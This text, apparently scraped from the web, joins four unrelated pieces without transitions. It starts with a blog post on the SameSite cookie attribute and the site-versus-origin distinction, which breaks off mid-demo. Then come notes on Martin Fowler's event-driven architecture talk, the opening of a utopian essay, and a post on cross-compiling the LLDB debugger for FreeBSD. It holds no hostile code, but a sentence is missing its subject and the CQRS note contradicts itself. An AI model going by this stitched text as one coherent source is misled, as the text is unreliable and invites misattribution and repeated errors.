<h2 id="the-advent-of-samesite">The advent of <code>SameSite</code> <a href="#the-advent-of-samesite">¶</a></h2>
<p>You have no doubt heard of the
<a href="https://developer.mozilla.org/en-us/docs/Web/HTTP/Headers/Set-Cookie/SameSite" target="_blank" rel="noopener"><code>SameSite</code> cookie attribute</a>.
It made headlines when, in February 2020,
Chrome started rolling out changes to <code>SameSite</code>’s default behaviour;
Firefox <a href="https://hacks.mozilla.org/2020/08/changes-to-samesite-cookie-behavior/" target="_blank" rel="noopener">followed suit</a> a few months later.</p>
<p>Intended as a defense-in-depth mechanism against cross-site attacks,
such as <a href="https://owasp.org/www-community/attacks/csrf" target="_blank" rel="noopener">cross-site request forgery (CSRF)</a>
and <a href="https://www.scip.ch/en/?labs.20160414" target="_blank" rel="noopener">cross-site script inclusion (XSSI)</a>,
<code>SameSite</code> had been lying dormant at the heart of implementing browsers
since <a href="https://tools.ietf.org/html/draft-west-first-party-cookies-07" target="_blank" rel="noopener">its inception in 2016</a>.</p>
<p><a href="https://blog.chromium.org/2020/02/samesite-cookie-changes-in-february.html" target="_blank" rel="noopener"><code>SameSite</code>’s activation in early 2020</a>
required labourious adjustments
by some websites to maintain third-party access,
but was widely hailed as a welcome addition to browser defences.
Both in anticipation and in reaction to <code>SameSite</code>’s activation in browsers,
posts started
sprouting on blogs all over the Web to spread the word
about the mechanics of the “new” cookie attribute.</p>
<h2 id="playing-fast-and-loose-with-terminology">Playing fast and loose with terminology <a href="#playing-fast-and-loose-with-terminology">¶</a></h2>
<p>Some of those posts were of admirable precision,
such as <a href="https://twitter.com/rowan_m" target="_blank" rel="noopener">Rowan Merewood</a>’s <a href="https://web.dev/samesite-cookies-explained/" target="_blank" rel="noopener">web.dev piece</a>
entitled “SameSite cookies explained”.
Unfortunately, relatively few of the posts about <code>SameSite</code>
went to the effort of clarifying the concept of <em>site</em>,
from which the concepts of <em>same-site request</em> and <em>cross-site request</em>
are of course derived.</p>
<p>Moreover, many posts,
including those produced by influential members of the infosec community,
appeared to use the terms “origin” and “site” interchangeably or, at least,
somewhat loosely.</p>
<p>Back in February 2019, Kristian Bremberg <a href="https://blog.detectify.com/2019/02/05/guide-http-security-headers-for-better-web-browser-security/" target="_blank" rel="noopener">wrote the following</a>
on the venerable Detectify blog:</p>
<blockquote>
<p>The SameSite attribute is rather new and provides excellent protection
against CSRF attacks. If a cookie uses the SameSite attribute,
the web browser will make sure that the request made with the cookie came
from the <strong>origin</strong> that sat [sic] the cookie.</p>
</blockquote>
<p>(my emphasis)</p>
<p>Infosec superstar <a href="https://twitter.com/troyhunt" target="_blank" rel="noopener">Troy Hunt</a> himself,
in <a href="https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/" target="_blank" rel="noopener">a seminal post</a> entitled
“Promiscuous Cookies and Their Impending Death via the SameSite Policy”
and published in early January 2020, described the effects of the different
<code>SameSite</code> attribute values as follows:</p>
<blockquote>
<ol>
<li>None: what Chrome defaults to today without a SameSite value set</li>
<li>Lax: some limits on sending cookies on a <strong>cross-origin</strong> request</li>
<li>Strict: tight limits on sending cookies on a <strong>cross-origin</strong> request</li>
</ol>
</blockquote>
<p>(my emphasis)</p>
<p>And a few months later, in an otherwise fascinating <a href="https://blog.reconless.com/samesite-by-default/" target="_blank" rel="noopener">post</a>
analysing how the advent of <code>SameSite</code> was affecting a range of vulnerabilities
cherished by hackers,
the <a href="https://twitter.com/0xReconless" target="_blank" rel="noopener">Reconless team</a> wrote the following:</p>
<blockquote>
<p>After the update, all cookies without an explicit <code>SameSite</code> attribute will
be treated as having <code>SameSite=Lax</code>.
This means <strong>cross-origin</strong> requests no longer carry cookies,
except for top-level navigations.</p>
</blockquote>
<p>(my emphasis)</p>
<p><em>Domain</em>, <em>host</em>, <em>origin</em>, <em>site</em>…
Using those terms loosely in informal communication is natural;
such laxity in the use of terminology can be forgiven,
and if you’ve been guilty of it yourself, you’re in good company.</p>
<h2 id="are-site-and-origin-interchangeable">Are “site” and “origin” interchangeable? <a href="#are-site-and-origin-interchangeable">¶</a></h2>
<p>However, the advent of the <code>SameSite</code> cookie attribute raises some questions…</p>
<ul>
<li>Is a careful distinction between “origin” and “site” warranted, here?</li>
<li>Is it just a distinction without a difference?</li>
<li>Is a <em>cross-site</em> request no different from a <em>cross-origin</em> request?</li>
<li>Could the cookie attribute have as well been named “SameOrigin”, then?</li>
<li>Or, if there is indeed a real difference between “site” and “origin”,
does it matter to practitioners?</li>
<li>And, if the difference does matter, how so?</li>
</ul>
<p>You may have already guessed the answers from the title of this post:
“site” has a very technical meaning in the context of <code>SameSite</code>,
yet it is unduly neglected;
and the distinction between <em>site</em> and <em>origin</em> <em>does</em> matter,
yet the two concepts are frequently conflated.</p>
<p>This lapse in terminology didn’t escape everyone.

felt the need to dedicate
a whole <a href="https://web.dev/same-site-same-origin/" target="_blank" rel="noopener">blog post</a>
about the distinction between “origin” and “site”,
only a few months after Chrome activated <code>SameSite</code>, is revealing.</p>
<p>In order to understand why the distinction matters,
you first need to understand the difference between <em>origin</em> and <em>site</em>.</p>
<h2 id="what-do-we-mean-by-origin">What do we mean by “origin”? <a href="#what-do-we-mean-by-origin">¶</a></h2>
<p>If you work with Web technologies,
you have at least some familiarity with the
<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">Same-Origin Policy (SOP)</a>,
arguably one of the main pillar of Web security.
The concept of <em>origin</em> of a URI is of course central to the SOP and,
as such, it is relatively well-understood.
<a href="https://tools.ietf.org/html/rfc6454#section-3.2" target="_blank" rel="noopener">Section 3.2 of RFC 6454</a> defines an <em>origin</em> as a triple:</p>
<blockquote>
<p>Roughly speaking, two URIs are part of the same origin
(i.e., represent the same principal) if they have the same
scheme, host, and port.</p>
</blockquote>
<p>The port is optional; if not specified, the default port associated to the scheme
is implied (e.g. 80 for <code>http</code> and 443 for <code>https</code>).
<a href="https://developer.mozilla.org/en-us/docs/Glossary/Origin" target="_blank" rel="noopener">MDN Web Docs</a> has a series of useful examples.</p>
<h2 id="what-do-we-mean-by-site">What do we mean by “site”? <a href="#what-do-we-mean-by-site">¶</a></h2>
<p>Behind the painfully generic term that is “site”
hides a concept fundamentally more difficult to grasp
than that of <em>origin</em>.
For one thing, the term “site” was not always a technical one:
it predates the SOP and was in in common use
<a href="https://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html" target="_blank" rel="noopener">when attacks like cross-site scripting came onto the scene</a>.
Furthermore, the modern concept of <em>site</em> is fraught with technical difficulties.
It is intimately linked to that of a host’s <em>registrable domain</em>,
which the <a href="https://url.spec.whatwg.org/#host-registrable-domain" target="_blank" rel="noopener">URL Living Standard</a> defines as</p>
<blockquote>
<p>[…] a domain formed by the most specific public suffix,
along with the domain label immediately preceeding it, if any.</p>
</blockquote>
<p>(A host’s registrable domain is also known as its “eTLD+1”, short for
“effective top-level domain plus one”.)</p>
<p>In the simplest of cases, <strong>the site of an origin simply corresponds
to the registrable domain (if any) of the origin’s host</strong>.</p>
<p>Two examples, to fix ideas:</p>
<ul>
<li>The site of <code>https://www.example.org</code> is <code>example.org</code>,
because <code>org</code> is the host’s most specific public suffix
and, therefore, <code>example.org</code> is the host’s eTLD+1.</li>
<li>The site of <code>https://jub0bs.github.io</code> is <code>jub0bs.github.io</code>,
because <code>github.io</code> is the host’s most specific public suffix
and, therefore, <code>jub0bs.github.io</code> is the host’s eTLD+1.</li>
</ul>
<p>Yes! Perhaps surprisingly, <a href="https://publicsuffix.org/list/public_suffix_list.dat" target="_blank" rel="noopener"><code>github.io</code> is a public suffix</a>!</p>
<p>It’s worth noting, however, that the concept of registrable domain is a fluid one,
because it relies on the <a href="https://publicsuffix.org/list/" target="_blank" rel="noopener">Public-Suffix List</a>,
a list which is not set in stone but <a href="https://github.com/publicsuffix/list/blob/master/public_suffix_list.dat" target="_blank" rel="noopener">subject to change over time</a>.
Not to mention that different browsers may not necessarily stay abreast of
changes to the Public-Suffix list at the same pace.</p>
<p>The technicalities do not end there!
As <a href="https://web.dev/schemeful-samesite/" target="_blank" rel="noopener">web.dev warns us</a>,
the concept of <em>site</em> is still evolving and
will soon incorporate the scheme also.
The change currently sits behind a flag in Chrome but will soon be rolled out.
However, to sidestep this difficulty and prolong the relevance of this post,
I’ll only consider origins whose scheme is <code>https</code> in what follows.</p>
<h2 id="same-site-vs-cross-site-requests">Same-site vs. cross-site requests <a href="#same-site-vs-cross-site-requests">¶</a></h2>
<p>Now that we’ve dealt with the concept of <em>site</em>,
we can finally discuss the concepts of <em>same-site</em> and <em>cross-site</em> requests.
A given request is either <em>same-site</em> or <em>cross-site</em>.
Whether a request is same-site or cross-site depends on the comparison
between the sites of the request’s source origin and target origin:</p>
<ul>
<li>If the two sites are identical, the request is said to be <em>same-site</em>;</li>
<li>If the two sites are different, the request is said to be <em>cross-site</em>.</li>
</ul>
<p>Here are three examples:</p>
<ol>
<li>A request sent from <code>https://foo.example.org</code> to <code>https://bar.example.org</code>
is same-site,
because the site of both origins is <code>example.org</code>.</li>
<li>A request sent from <code>https://foo.github.io</code>
to <code>https://bar.github.io</code> is cross-site,
because the site of the first origin is <code>foo.github.io</code>,
whereas the site of the second origin is <code>bar.github.io</code>.</li>
<li>A request sent from <code>https://foo.bar.example.org</code> to <code>https://bar.example.org</code>
is same-site, because the site of both origins is <code>example.org</code>.</li>
</ol>
<p>If you’ve made it this far down the present post, I thank you for your patience.
Take heart: the payoff is near!</p>
<h2 id="cross-origin-same-site-requests">Cross-origin, same-site requests <a href="#cross-origin-same-site-requests">¶</a></h2>
<p>All cross-site requests are necessarily cross-origin; that much is clear.
However, as shown by the first and third examples above,
not all cross-origin requests are cross-site.</p>
<p><img src="https://jub0bs.com/images/cor_vs_csr.svg" alt="Venn-diagram"></p>
<p>And the <code>SameSite</code> cookie attribute is only concerned with cross-site requests;
it has no effect on cross-origin requests that happen to be same-site.
This is why the distinction between <em>origin</em> and <em>site</em> is important.</p>
<h2 id="online-demo">Online demo <a href="#online-demo">¶</a></h2>
<p>To prove my point,
I’ve drawn inspiration from <a href="https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/" target="_blank" rel="noopener">Troy Hunt’s post</a> and
I’ve deployed a simple Go server to <code>samesitedemo.jub0bs.com</code> composed
of two simple endpoints.
Endpoint <code>/setcookie</code> sets a <code>SameSite=Strict</code> cookie, like so</p>
<div><pre><code data-lang="http"><span>Set-Cookie: StrictCookie=foo; Path=/; Max-Age=3600; SameSite=Strict
</span></code></pre></div><p>Endpoint <code>/readcookie</code> prints the cookie (if any) attached to the request.
I’ve also set up two “attacking” pages:</p>
<ul>
<li><a href="https://jub0bs.github.io/samesitedemo-attacker-foiled" target="_blank" rel="noopener">https://jub0bs.github.io/samesitedemo-attacker-foiled</a></li>
<li><a href="https://samesitedemo-attacker.jub0bs.com/" target="_blank" rel="noopener">https://samesitedemo-attacker.jub0bs.com/</a></li>
</ul>
<p>Both pages simply consist in a single link to
<code>https://samesitedemo.jub0bs.com/readcookie</code>.</p>
<p>To fix ideas, here’s what you can do:</p>
<ol>
<li>Navigate to
<a href="https://samesitedemo.jub0bs.com/setcookie" target="_blank" rel="noopener">https://samesitedemo.jub0bs.com/setcookie</a>.
Doing so will set the <code>Strict</code> cookie in your browser.</li>
<li>Navigate to
<a href="https://jub0bs.github.io/samesitedemo-attacker-foiled" target="_blank" rel="noopener">https://jub0bs.github.io/samesitedemo-attacker-foiled</a>
and follow the link on that page.
Because the site of the attacking URI (<code>jub0bs.github.io</code>)
is different from that of the target URI (<code>jub0bs.com</code>),
the browser does not attach the cookie to the request resulting from
following the link, and no cookie gets printed in the response.
<code>SameSite=Strict</code> works as expected, and the “attack” is foiled.</li>
<li>Now navigate to
<a href="https://samesitedemo-attacker.jub0bs.com/" target="_blank" rel="noopener">https://samesitedemo-attacker.jub0bs.com/</a>
and follow the link on that page.

<p><strong>Notes Taken: 2021-01-28</strong></p>
<p><a rel="noopener" target="_blank" href="https://www.youtube.com/watch?v=STKCRSUsyP0">GOTO 2017 • The Many Meanings of Event-Driven Architecture • Martin Fowler</a></p>
<p>Martin explains there are several different understandings of what Event-Driven Architecture is. All of these are valid but are distinct in their actual form. Martin delves into four of these.</p>
<p>At a high level, there is a difference between events and commands.
Events explain, 'something <strong>has</strong> happened', the receiver is free to ignore the event or do something in response to the event occurring.
Commands explain, 'something <strong>should</strong> happen', the producer of the command has to know what command to issue.
Events and commands are both valid, the disadvantage of commands is that the producer has to know which system wants to react to a command, and the producer must issue the appropriate command - arguably this creates more coupling.</p>
<p>The four patterns of Event-Driven Architecture:</p>
<ol>
<li>Event Notification</li>
<li>Event Carried State Transfer</li>
<li>Event Sourcing</li>
<li>CQRS (Command Query Responsibility Segregation)</li>
</ol>

<h2 id="pattern-1-event-notification">Pattern 1: Event Notification</h2>
<p><a rel="noopener" target="_blank" href="https://www.youtube.com/watch?v=STKCRSUsyP0&amp;t=200s">Timecode - 3:20</a></p>
<p>Martin pictures a system where a user changes their address in the <strong>Customer Management System</strong>, this should cause the&nbsp;<strong>Insurance Quoting System</strong> to calculate a new quote for the customer. In a classic model, the customer management system must call out to the Insurance Quoting System to order a requote. This creates a strong coupling, in particular the Customer Management System is dependent on the Insurance Quoting System. This is likely suboptimal as the Insurance Quoting System is a more specialised and less general system than the Customer Management System; Martin argues dependencies should usually be drawn from specialised systems to more general systems. Instead of calling from the Customer Management System to the Insurance Quoting System, the Customer Management System could publish an event 'CustomerAddressChange' to a queue, and the Insurance Quoting System could listen for these events and requote the customer when it receives the event. This effectively alters a coupling of&nbsp;'<em>Customer Management System -&gt; Insurance Quoting System</em>' into&nbsp;<em>Customer Management System -&gt; Event Queue &lt;- Insurance Quoting System</em>.
This is the most basic of event architectures, it simply alters the way dependencies can be drawn.</p>
<h2 id="pattern-2-event-carried-state-transfer">Pattern 2: Event Carried State Transfer</h2>
<p><a rel="noopener" target="_blank" href="https://www.youtube.com/watch?v=STKCRSUsyP0&amp;t=893s">Timecode - 14:53</a></p>
<p>A less common pattern. Built atop Event Notification, when we receive an event, we pull the data from the Customer Management System and store the relevant parts in our own database. This means the Insurance Quoting System can stay available, even when the Customer Management System goes down. The problem is we now have to copies of data so we lose consistency.</p>
<h2 id="pattern-3-event-sourcing">Pattern 3: Event Sourcing</h2>
<p><a rel="noopener" target="_blank" href="https://www.youtube.com/watch?v=STKCRSUsyP0&amp;t=1251s">Timecode - 20:51</a></p>
<p>The previous two patterns are largely still CRUD, when we make a change, we save it to a database,&nbsp;<strong>overwriting</strong> the previous value and maybe publishing an event.
Event Sourcing changes this, we both overwrite the current state but we also log an event to an event log.
We now have a system with two forms of state, the <strong>application state</strong> and the&nbsp;<strong>event log</strong>.
The application state is the point in time state, which can be recovered from the&nbsp;<strong>event log</strong>.
The standard for an event sourcing system, is that at any point in time the application state can be destroyed and we can&nbsp;<strong>reliably recover</strong> from the&nbsp;<strong>event log</strong>.
In Event Sourcing, we move from being oriented around application state, with events as an optional extra, to being oriented around a log of all events, with application state derived from that log.</p>
<p>Developers are constantly using an example of an event sourcing program, almost all vcs systems such as git are event sourced.
The current commit/working state is the application state, and branches, commits, etc are all just events in the event log.
For business people, an accounting system makes for a good analogy to an event sourced system.
The current balance of accounts is the application state, but the series of entries in the ledger is the set of events that are used to construct that state.</p>
<p>One great benefit of Event Sourcing is that we can change the models of application state at any time, and fully reconstruct from our event log. Instead of writing database migrations when data models change, like we do in the SQL world, we just change how state is derived from events. We can even test systems in a read only mode against production, by reading the event log to construct a new application state. One key advantage Martin mentions is that Event Sourcing enables a 'Memory Image'. This essentially means that our application state can be completely ephemeral, and in memory; you don't need a database for application state, you only need to read from the event log and construct the application state in memory. This can be very fast and performant. The other benefit of this is that memory is super fast, and you can essentially avoid database calls, whilst having persistence. Martin mentions, think about the opportunities opening up here as we begin to see more and more systems with high amounts of RAM or super fast non-volatile RAM.</p>
<p>There are added complexities. Consider how you can order events reliably. Consider how you ensure transactional guarantees, if you write to the event log, you must also update the application state at the same time. You can't update application state before writing to the event log because then you have a working state that is ahead of the event log state, and remember, the event log state is the source of truth. Event Sourcing systems generally bring asynchrony with them, and this can add quite a bit of complexity. You must also consider consistency, what does it mean to write to the event log, if other systems are going to react to those events, they will not be consistent at the point of time you write to the event log. This is a trade off with all event driven architectures however.</p>
<p>Martin mentions in passing that he is very surprised by how uncommon Event Sourcing is in practice.</p>
<p>Martin brings forward a final and very important consideration when Event Sourcing. We must carefully consider which events are worth storing, and which are not. Suppose there is a service that receives an order to 'buy 15 widgets', the service then creates a transaction that is stored in the application state, this transaction contains additional info like the tax applied and any discounts applied. The service could persist an event with the business logic derived details, such as tax and discounts, or an event that most closely mirrors the input request. The advantage of the former is that the event log contains a more precise record of what was computed at the time the request was received, the advantage with the latter is that it contains only the bare minimum required to recompute the application state, and nothing more. In practice, many systems persist both types of events. Greg Young says that there should be no business logic between your events and your application state.</p>
<h2 id="pattern-4-command-query-responsibility-segregation">Pattern 4: Command Query Responsibility Segregation</h2>
<p><a rel="noopener" target="_blank" href="https://www.youtube.com/watch?v=STKCRSUsyP0&amp;t=2611s">Timecode - 43:31</a></p>
<p>Martin warns outright, this is a complex pattern that is more often than not implemented incorrectly, and can cause troubles if so. The idea here is to separate out the write (command) path from the read (query) path of your system. This is particularly useful when you have an application that is read from much more frequently than it is read from, especially if the reads are of a form derived from the write form.</p>

<section id=""><div><h3><strong>Introduction</strong></h3>
<blockquote>
<p><span><em>“Bathed in light, the world remains our first and last love.” —Albert Camus</em></span></p>
</blockquote>
<p>Anyone writing seriously about utopia in September of 2020 will seem—to be charitable—a little disconnected from reality.</p>
<p>The American West is burning. The Arctic is melting. Populism and authoritarianism are on the rise. Nearly a million people have died from the coronavirus. Economic inequality continues to grow, only accelerated by the pandemic.</p>
<p>If there’s anything like a road to utopia—if we can even begin to entertain such an idea—we don’t seem to be on it. The belief that society’s problems can be solved seems ridiculous when each day brings fresh horrors. Our collective failure to make so much as a dent on climate change, the cancerous spread of polarizing misinformation with its fracturing of society, and the irretrievable damage we are inflicting on the biosphere, only deepen a sense that the best we can hope for now is adaptation and survival in an environment increasingly hostile (physically, psychologically, spiritually) to the individual.</p>
<p>But hope, as “Mad” Max Rockatansky <a href="https://www.youtube.com/watch?v=MaN4sboc7E8" target="_blank" rel="noopener">reminds us from the other side of collapse</a>, is a mistake, and despair paralyzes. What we need are viable alternatives. Alternatives that go beyond bolt-on fixes to broken systems. Alternatives we can imagine living—and thriving—in. And most importantly, alternatives we can look for in our present and in our past, not in some idealized future.</p>
<p>Utopia is in the air again, though few dare call it by that name. Ideas that would be dismissed just a few short years ago as “utopian”—a word that has been cut down to pejorative status—are entering into the mainstream. Political programs like the Green New Deal promise solutions that could spare us from the worst effects of climate change while stimulating the economy. Universal Basic Income and its brethren suggest how we might mend broken social safety nets and ease economic inequality. But what we lack, and urgently need, is a vision of the world we want to bring into being. That’s all utopianism is: the audacity to imagine the world we want, and then living as though that world were possible.</p>
<p>Metals become malleable when subjected to heat. In higher temperatures, they melt, making it possible to cast existing forms into new shapes. Culture I/O is premised on a belief that under certain conditions, the malleability of our society increases as well. The coming decade, more than any other in recent memory, will be turbulent and heated. In the words of Arundhati Roy: <em>“We can choose to walk through it, dragging the carcasses of our prejudice and hatred, our avarice, our data banks and dead ideas, our dead rivers and smoky skies behind us. Or we can walk through lightly, with little luggage, ready to imagine another world. And ready to fight for it.”</em> ☼</p>

<p>A guide to utopia has to start with a foundation of all the concepts feeding into it: ourselves, nature, technology, society, and the other Big Things. It’s easier to go on a journey together if we all leave from the same place.</p>

<blockquote>
<p><span><em>“I am neither a liberal nor a conservative…. My holy of holies is the human body, health, intelligence, talent, inspiration, love, and absolute freedom.” —Anton Chekhov</em></span></p>
</blockquote>
<ul>
<li>A society consists of individuals. Only individuals suffer, experience joy, love, longing, pleasure, pain, act with intent, die. They can do so collectively, but always and only as individuals. <strong>In the end, only individuals matter.</strong></li>
<li>This is an ontological position, not a value judgement. A family or society exists only insofar as its individual members exist.</li>
<li>Because of this, we should reject any ideology that stresses the primacy of a group at the expense of individuals.</li>
<li>Similarly, we should reject any ideology that places a system (such as markets) above individuals.</li>
<li>This should not be taken as an endorsement of individualism. Individuals do not exist in isolation. The point is simply that we should always treat individuals as <em>ends</em>, never as <em>means</em>.</li>
<li>Humans are complex, emotional, self-aware animals with a degree of free will—not rational agents, logic machines, or biological algorithms.</li>
<li>Humans are not the only complex, emotional, self-aware animals on this planet.</li>
<li>The quickest path to dooming any human undertaking is to assume that we can become, or even reliably pretend to be, anything other than what we are—both at our best and at our worst.</li>

<section id="minds"><div><h3><span>2. Minds</span></h3>
<blockquote>
<p><span><em>“Use your head, can’t you, use your head, you’re on earth, there’s no cure for that!” —Samuel Beckett</em></span></p>
</blockquote>
<ul>
<li>The human brain is the most mysterious and versatile physical structure in the known world. We know more about how the universe came to be than how the brain works.</li>
<li>The nature of the relationship between brain, mind, and consciousness is the greatest scientific question of our time.</li>
<li>Though we are emotional creatures first and foremost, we are wired for reason. Using only his mind and some crude observations, Aristarchus of the Greek island of Samos figured out that the Earth orbits the Sun almost 2,000 years before this became accepted fact. Einstein produced four of his groundbreaking papers in one year spent hunched over a desk in a musty Bern patent office, with reason as his only instrument.</li>
<li>In spite of these impressive abilities, we are extremely susceptible to biases and fallacies in our thinking—and to those who would exploit these biases.</li>
<li>The either/or fallacy is one of the most pernicious of these errors, passed down to us by Aristotle. It suggests that everything must be either this, or that. Good or bad. Nature or nurture. Introvert or extrovert. Liberal or conservative. It is the binary logic of machines applied to an analog world full of semantic nuance, contradiction, and mystery. If we are, on a species-level, in trouble, it is in large part because of our inability to internalize the fact that multiple ideas which seem opposed to each other can simultaneously be true.</li>
<li>This does not mean that truth is relative. It isn’t. Only that out in the world, truth is more complicated than it seems. If we simplify the world in order to function in it, we do so at our peril.</li>

<section id="language"><div><h3><span>3. Language</span></h3>
<blockquote>
<p><span><em>“The map is not the territory.” —Alfred Korzybski</em></span></p>
</blockquote>
<ul>
<li>Words are not reality—they represent abstractions that allow us to make sense of reality, to think and talk about it.</li>
<li>This is important because it means that words do not and cannot map perfectly to reality, and that different languages—systems of words—can reflect reality in subtly different ways.</li>
<li>Words matter. Words and mind are inextricably linked and together they create the feedback loop that makes reasoning possible.</li>
<li>The abuse of language is a form of psychological abuse. George Orwell memorably took it to task in <a href="https://www.orwellfoundation.com/the-orwell-foundation/orwell/essays-and-other-works/politics-and-the-english-language/" target="_blank" rel="noopener"><em>Politics and the English Language</em></a> three quarters of a century ago, but we’ve been at it for much, much longer. What is new is the degree to which words have saturated our lives. Social media and 24 hour news have made it impossible to escape.</li>
<li>Precision and clarity are how we push back against the abuse of language. Because we use words to think, choosing them with care leads to clearer arguments and thoughts. We should always strive to practice good linguistic hygiene, and to use language in good faith—for our own sanity, if nothing else.</li>
<li>Where pushing back is impossible, we must step away. Silence can be a virtue.</li>
<li>The only way to have a productive discussion involving abstractions (democracy, justice, utopia) is to clearly and rigorously define them first. Often we’ll find that the discussion ends up fixating on the definitions of the words themselves. This is a good thing.</li>
</ul>

<ul>
<li>We are surrounded by and enmeshed in systems.</li>
<li>Thinking in terms of systems helps us to make sense of a chaotic and unpredictable world.</li>
<li>Societies are systems. Culture is a system. Governments, markets, weather, language, and the biosphere are all examples of systems.</li>
<li>Some complex systems are too big and too complicated to think about coherently. We call these types of systems <em><strong>hyperobjects</strong></em>.</li>
<li>Complex systems can be broken down into simpler ones for the purpose of thinking about them.</li>
<li>It’s possible to understand how a system works without being able to make accurate predictions about it. But we should be wary of our tendency to believe that we understand systems which we do not.</li>
<li>It’s impossible to make accurate long-term predictions about most complex systems.</li>
<li>Some systems tend towards stability through self-regulation, while others are inherently unstable.</li>
<li>It’s not necessary to understand how a system works before acting to change it. In fact, history is the story of humans collectively changing or dismantling systems before understanding them—often with serious consequences (like climate). But a system must be understood in order to effectively change it <em>with a specific outcome in mind</em>.</li>
<li>It’s unproductive to approach systems dogmatically. No system is inherently good or bad. But we should evaluate systems, especially those created by humans, based on our convictions about what is desirable and undesirable.</li>
<li>Most complex systems are interwoven with others and cannot be fully understood in isolation.</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Moritz Systems have started a new contract with the <a href="https://freebsdfoundation.org/">FreeBSD Foundation
</a> to continue our work on modernizing
the <a href="https://lldb.llvm.org/">LLDB</a> debugger’s support for <a href="https://www.freebsd.org/">FreeBSD</a>.  Throughout the previous contract we have
introduced a FreeBSD Remote Process Plugin utilizing the mode modern
client-server layout of LLDB.</p>
<p>We have managed to achieve the feature parity with the original FreeBSD
plugin on the x86 architecture.  However, as of today other
architectures still use the original.  During the next two months,
we are going to work on bringing the remaining previously supported
architectures to the new layout, with special focus on providing first
class support for ARM64 (also known as AArch64) architecture.  Afterwards, we are going to
continue improving FreeBSD support in LLDB.</p>
<p>The complete Project Schedule is divided into four milestones, each
taking approximately one month:</p>
<ul>
<li>M1 Switch all the non-x86 CPUs to the LLDB FreeBSD
Remote-Process-Plugin.</li>
<li>M2 Iteration over regression tests on ARM64 and fixing known bugs,
marking the non-trivial ones for future work.  Remove the old
local-only Process-Plugin.</li>
<li>M3 Implement follow-fork and follow-vfork operations on par with
the GNU GDB support.  Cover the functionality with LLDB regression
tests.</li>
<li>M4 Implement SaveCore functionality for FreeBSD and enhance
the regression testing of core files in LLDB.  Update the FreeBSD
manual.</li>
</ul>
<h2 id="cross-compiling-lldb-to-other-freebsd-architectures">Cross-compiling LLDB to other FreeBSD architectures</h2>
<h3 id="a-short-introduction-to-cross-compilation">A short introduction to cross-compilation</h3>
<p>Cross-compilation is a technique permitting to use a compiler running
on one platform to create executables for another platform.  It can
be used to build software for another CPU architecture (e.g. ARM64
executables on an x86 system) or e.g. for another operating system
(e.g. FreeBSD packages from Linux), or both.</p>
<p>The most common use case for cross-compilation is to use a single
development environment to produce executables for multiple target
platforms.  What’s really important for our case, it permits building
software much faster than when running a native compiler via an emulator
or on hardware that is much less performant than modern x86 PCs
(e.g. commonly available ARM boards).</p>
<p>An important limitation of cross-compilation is that the resulting
executables cannot be executed on the platform running the compiler.
This means that the tools needed at build-time need to be built
separately – depending on the build system, this either needs to
be done manually or is done automatically as part of cross compilation.
This also means that the build scripts cannot perform tests that
require running the test program.</p>
<p>There are two main prerequisites to cross-compilation:</p>
<ol>
<li>
<p>A cross-toolchain, i.e. the compiler and link editor capable
of producing executables for the target platform.</p>
</li>
<li>
<p>A sysroot, i.e. the system libraries and dependencies compiled
for the target platform.</p>
</li>
</ol>
<h3 id="preparing-the-cross-compiler-and-sysroot">Preparing the cross-compiler and sysroot</h3>
<p>Ordinarily in order to obtain a cross-toolchain, you need to build
the compiler for a specific target.  However, the Clang compiler
that is used by default on FreeBSD has integrated cross-compilation
support.  Rather than rebuilding the whole compiler for each target,
it is sufficient to ensure that appropriate target support is enabled
at build time.  Therefore, the standard Clang builds on FreeBSD are
sufficient to cross-build for ARM and ARM64.</p>
<p>Cross-compiling a FreeBSD sysroot is very similar to building it
natively.  The only difference is the necessity of passing
a <code>TARGET_ARCH</code> variable specifying the target architecture.
For example, to build arm64 sysroot we run the following commands
in <code>/usr/src</code>:</p>
<div><pre><code data-lang="bash">make -j<span>$(</span>sysctl -n hw.ncpu<span>)</span> buildworld TARGET_ARCH<span>=</span>aarch64
make -j<span>$(</span>sysctl -n hw.ncpu<span>)</span> installworld TARGET_ARCH<span>=</span>aarch64 <span>\
</span><span></span>    DESTDIR<span>=</span>/sysroot/arm64
make -j<span>$(</span>sysctl -n hw.ncpu<span>)</span> distribution TARGET_ARCH<span>=</span>aarch64 <span>\
</span><span></span>    DESTDIR<span>=</span>/sysroot/arm64</code></pre></div>
<h3 id="cross-compiling-llvm">Cross-compiling LLVM</h3>
<p>LLVM is using the CMake build system.  CMake partially facilitates
cross-compilation itself, while the other part is handled
in LLVM-specific CMake files.</p>
<p>The first step towards cross-compiling CMake-based projects is to
create a toolchain file.  This file is used to set some internal CMake
variables that cannot be directly overriden via the command-line.
One toolchain file can be shared between multiple projects, so it is
also a convenient place to set standard cross-related CMake options.</p>
<p>For our purpose, <code>toolchain-arm64.cmake</code> contained the following
variables:</p>
<div><pre><code data-lang="cmake"><span># Since we are using clang as the compiler and it is the default
</span><span># on FreeBSD, we do not need to override the compiler.  However,
</span><span># we do need to pass a correct -target indicating the platform we're
</span><span># build for and the path to our sysroot.
</span><span></span>set(<span>CMAKE_C_FLAGS</span>
    <span>"-target aarch64-unknown-freebsd13.0 --sysroot /sysroot/arm64"</span>)<span>
</span><span></span>set(<span>CMAKE_CXX_FLAGS</span>
    <span>"-target aarch64-unknown-freebsd13.0 --sysroot /sysroot/arm64"</span>)<span>
</span><span>
</span><span></span><span># While this may seem redundant, setting it explicitly (even to the same
</span><span># value) actually causes CMake to consider itself to be cross-compiling.
</span><span># This is important since LLVM relies on CMAKE_CROSSCOMPILING being set.
</span><span></span>set(<span>CMAKE_SYSTEM_NAME</span> <span>"FreeBSD"</span>)<span>
</span><span>
</span><span></span><span># Force library search functions to use our sysroot.  Make sure it never
</span><span># uses programs from the sysroot (since we can't execute them).  Headers
</span><span># and libraries have to be taken from sysroot, on the other hand.
</span><span></span>set(<span>CMAKE_FIND_ROOT_PATH</span> <span>"/sysroot/arm64"</span>)<span>
</span><span></span>set(<span>CMAKE_FIND_ROOT_PATH_MODE_PROGRAM</span> <span>NEVER</span>)<span>
</span><span></span>set(<span>CMAKE_FIND_ROOT_PATH_MODE_LIBRARY</span> <span>ONLY</span>)<span>
</span><span></span>set(<span>CMAKE_FIND_ROOT_PATH_MODE_INCLUDE</span> <span>ONLY</span>)</code></pre></div>
